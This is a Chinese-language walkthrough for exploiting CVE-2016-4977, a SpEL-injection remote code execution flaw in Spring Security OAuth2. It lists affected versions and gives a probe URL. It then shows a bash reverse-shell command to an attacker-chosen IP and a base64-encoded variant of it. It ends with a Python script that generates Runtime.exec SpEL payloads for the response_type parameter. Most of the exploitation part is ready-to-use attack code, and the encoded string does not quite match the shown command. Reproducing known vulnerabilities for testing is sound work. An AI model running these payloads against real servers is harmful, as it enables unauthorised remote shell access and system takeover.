# Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

# 漏洞描述

**Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞**



# 影响版本

Spring Security OAuth 2.3到2.3.2

Spring Security OAuth 2.2到2.2.1

Spring Security OAuth 2.1到2.1.1

Spring Security OAuth 2.0到2.0.14



# 漏洞复现

**ip修改对方网站ip，执行的命令即为括号内的2\*3**

**检测POC**

```html
http://your-ip:8080/oauth/authorize?response_type=${2*3}&client_id=acme&scope=openid&redirect_uri=http://test
```

拼接访问之后发现执行成功，如下图：

![img](https://img-blog.csdnimg.cn/fbb458890c564d898adbdf95b762410e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA56eN5qCR5Lq6MQ==,size_20,color_FFFFFF,t_70,g_se,x_16)

# **反弹shell**

**此处需要使用到python脚本来生成要执行的payload**

**使用python3运行脚本，然后输入反弹shell的命令即可生成paylaod**



**反弹shell命令如下:           ip修改为自己的**

```bash
bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/1122 0>&1
```

**将反弹shell命令进行bash64编码**

**乱码即为反弹shell的命令，修改为自己的**

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3h4eC54eHgueHh4Lnh4eC8xMTIyIDA+JjE=}|{base64,-d}|{bash,-i}
```

使用脚本生成payload，如下图

![image-20220428184327217](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220428184327217.png)

**payload生成好之后，将${2\*3}替换为生成的payload即可反弹shell**

```
http://your-ip:8080/oauth/authorize?response_type=${2*3}&client_id=acme&scope=openid&redirect_uri=http://test
```

**利用kali监听，在url处拼接，进行访问，反弹shell**

![image-20220428184538854](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220428184538854.png)

成功getshell



# Payload

```python
#!/usr/bin/env python

message = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])

for ch in message[1:]:
    poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)

poc += ')}'

print(poc)
```

